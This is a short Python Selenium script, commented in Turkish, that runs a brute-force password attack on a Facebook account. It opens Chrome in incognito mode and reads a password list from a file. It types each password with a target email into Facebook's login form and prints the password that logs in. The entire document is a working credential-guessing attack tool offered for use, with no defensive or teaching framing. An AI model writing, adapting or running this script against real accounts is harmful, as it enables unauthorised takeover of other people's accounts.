from selenium import webdriver
import time
from selenium.webdriver.chrome.options import Options

kullanici_adi = "eposta@gmail.com"                                  #Saldiri Denenecek Eposta Adresi

settings = webdriver.ChromeOptions()                                #Chrome Parametreleri icin nesnenin olusuturulmasi
settings.add_argument("--incognito")                                #Chrome Tarayicisinin gizli modda calismasinin saglanmasi
browser = webdriver.Chrome("chromedriver.exe",options=settings)     #ChromeDriver araciligi ile uygulama kontrolu

def facebook_giris_attack(tarayici,email):
    tarayici.get("https://www.facebook.com")                #Internet Sayfasinin Acilmasi
    dosya = open("cain.txt",mode="r",encoding="utf-8")      #Sifrelerin Kayitli Oldugu Dosyanin Acilmasi
    sifreler = dosya.readlines()                            #Dosyanin Satirlarinin Ayristirilmasi
    bulunan_sifre = ""                                      #Bulunan Sifre yi Kayit Edebilecegimiz degisken 
    for sifre in sifreler:                                  #Sifrelerin denenmesi icin dongunun olusturulmasi
                                                #Eposta giris tag'inin Xpath ile bulunmasi
        tarayici.find_element_by_xpath("/html/body/div[1]/div[2]/div/div/div/div/div[2]/form/table/tbody/tr[2]/td[1]/input").send_keys(email)
                                                #Parola giris tag'inin Xpath ile bulunmasi
        tarayici.find_element_by_xpath("/html/body/div[1]/div[2]/div/div/div/div/div[2]/form/table/tbody/tr[2]/td[2]/input").send_keys(sifre.replace("\n",""))
                                                #Giris butonunun tag'inin Xpath ile bulunmasi
        tarayici.find_element_by_xpath("/html/body/div[1]/div[2]/div/div/div/div/div[2]/form/table/tbody/tr[2]/td[3]/label/input").submit()
        time.sleep(1)                           #Sayfanin yuklenmesi icin 1 saniye beklenmesi
        bulunan_sifre = sifre                   #Sifrenin degiskene alinmasi
        if tarayici.current_url == "https://www.facebook.com/":         #giris yapildiysa donguden cikarilmasi
            break
        else:                                                           #giris yapilmadiysa tekrardan denenmesi icin sayfanin yuklenmesi 
            browser.get("https://www.facebook.com/")
    print(bulunan_sifre)                                    #Bulunan sifrenin Yazdirilmasi

facebook_giris_attack(browser,kullanici_adi)                #Calistirma

